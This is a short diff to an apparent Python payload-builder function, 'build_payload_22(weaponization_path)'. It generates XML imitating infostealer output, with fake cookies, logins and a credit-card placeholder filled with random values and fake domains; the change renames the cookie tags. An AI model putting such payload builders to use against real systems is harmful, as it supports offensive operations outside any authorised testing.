@@ -359,7 +359,7 @@ def build_payload_22(weaponization_path):
         payload += '<a:CC/>' # Credit Cards coming soon
         payload += '<a:Cookies>'
         for c in range(random.randint(50, 123)):
-            payload += '<a:Cookie>'
+            payload += '<a:ScannedCookie>'
             payload += '<a:Expires>0</a:Expires>'
             payload += '<a:Host>' + fakeDomains[random.randint(0, len(fakeDomains) - 1)] + '</a:Host>'
             payload += '<a:Http>false</a:Http>'
@@ -369,7 +369,7 @@ def build_payload_22(weaponization_path):
             payload += '<a:Secure>false</a:Secure>'
             payload += '<a:Value>' + ''.join(
                 random.choices(string.ascii_uppercase + string.digits, k=random.randint(10, 34))) + '</a:Value>'
-            payload += '</a:Cookie>'
+            payload += '</a:ScannedCookie>'
         payload += '</a:Cookies>'
         payload += '<a:Logins>'
         for p in range(random.randint(7, 23)):
